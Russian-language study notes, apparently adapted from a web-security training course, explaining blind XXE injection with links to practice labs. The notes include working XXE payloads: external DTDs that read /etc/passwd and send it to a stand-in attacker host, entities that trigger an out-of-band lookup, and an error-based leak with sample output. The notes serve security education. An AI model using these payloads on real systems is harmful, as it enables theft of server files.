Уязвимости Blind XXE возникают, когда приложение уязвимо для внедрения XXE, но не возвращает значения каких-либо определенных внешних сущностей в своих ответах. Это означает, что прямое извлечение файлов на стороне сервера невозможно, и поэтому уязвимости Blind XXE, как правило, сложнее эксплуатировать, чем обычные уязвимости XXE.

Существует два основных способа обнаружения и эксплуатации уязвимостей слепого XXE:
- Можно инициировать внеполосные сетевые взаимодействия, иногда извлекая конфиденциальные данные из данных взаимодействия.
- Инициировать ошибки анализа XML таким образом, чтобы сообщения об ошибках содержали конфиденциальные данные.

# Обнаружение слепого XXE с использованием внеполосных (OAST) методов

Часто можно обнаружить слепой XXE, используя ту же технику, что и для [атак XXE SSRF](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) , но запуская внеполосное сетевое взаимодействие с системой, которую мы контролируем. Например, можно определить внешний объект следующим образом:

```
<!DOCTYPE foo [ 
	<!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
]>
```

#### Лаба
[[Лабораторная работа слепой XXE с внеполосным взаимодействием]]


Иногда атаки XXE с использованием обычных сущностей блокируются из-за некоторой проверки ввода приложением или некоторого усиления используемого парсера XML. В этой ситуации можно использовать сущности параметров XML вместо них. Сущности параметров XML — это особый вид сущности XML, на которую можно ссылаться только в другом месте в пределах DTD. 

Объявление сущности параметра XML включает символ процента перед именем сущности:
`<!ENTITY % myparameterentity "my parameter entity value" >`

Для ссылки на параметрические сущности используется символ процента вместо обычного амперсанда:
`%myparameterentity;`

Это означает, что можно проверить наличие слепого XXE, используя внеполосное обнаружение с помощью сущностей параметров XML следующим образом:

```
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> 
	%xxe; 
]>
```

Эта полезная нагрузка XXE объявляет сущность параметра XML, которая называется `xxe`, а затем использует сущность в DTD. Это вызовет поиск DNS и HTTP-запрос к домену злоумышленника, подтверждая, что атака была успешной.

#### Лаба
[[Лаборатория слепой XXE с внеполосной взаимодействием через объекты XML-параметры]]


# Использование слепого XXE для извлечения данных за пределы канала

Пример вредоносного DTD для извлечения содержимого `/etc/passwd`файла выглядит следующим образом:

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 

%eval; 
%exfiltrate;
```

Данный DTD выполняет следующие шаги:
- Определяет параметрическую сущность XML с именем `file`, содержащую содержимое файла `/etc/passwd`.
- Определяет параметр XML-сущности, называемый `eval`, содержащий динамическое объявление другой параметр XML-сущности, называемой `exfiltrate`. `exfiltrate`Сущность будет оценена путем выполнения HTTP-запроса к веб-серверу злоумышленника, содержащего значение сущности `file`в строке запроса URL.
- Использует сущность, что приводит к выполнению `eval`динамического объявления сущности .`exfiltrate`
- Использует `exfiltrate`сущность, так что ее значение оценивается путем запроса указанного URL.

#### Примечание
Этот метод может не работать с некоторым содержимым файла, включая символы новой строки, содержащиеся в `/etc/passwd`файле. Это связано с тем, что некоторые парсеры XML извлекают URL во внешнем определении сущности с помощью API, который проверяет символы, разрешенные для использования в URL. В этой ситуации может быть возможно использовать протокол FTP вместо HTTP.

#### Лаба
[[Лабораторная работа Эксплуатация слепого XXE для извлечения данных с использованием вредоносного внешнего DTD]]


# Использование слепого XXE для извлечения данных через сообщения об ошибках

Альтернативный подход к эксплуатации слепого XXE заключается в запуске ошибки анализа XML, где сообщение об ошибке содержит конфиденциальные данные, которые мы хотим получить. Это будет эффективно, если приложение вернет результирующее сообщение об ошибке в своем ответе.

Можно вызвать сообщение об ошибке анализа XML, содержащее содержимое файла, `/etc/passwd`используя вредоносный внешний DTD следующим образом:

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```

**Данный DTD выполняет следующие шаги:**

- Определяет параметрическую сущность XML с именем `file`, содержащую содержимое файла `/etc/passwd`.

- Определяет параметр XML-сущности, называемую `eval`, содержащую динамическое объявление другой параметр XML-сущности, называемой `error`. `error`Сущность будет оценена путем загрузки несуществующего файла, имя которого содержит значение `file`сущности.

- Использует сущность, что приводит к выполнению `eval`динамического объявления сущности .`error`

- Использует `error`сущность, так что ее значение оценивается путем попытки загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащему имя несуществующего файла, которое является содержимым файла `/etc/passwd`.

Вызов вредоносного внешнего DTD приведет к появлению сообщения об ошибке, подобного следующему:
`java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...`

#### Лаба
[[Лаборатория эксплуатируя Blind XXE для получения данных с помощью сообщений об ошибках]]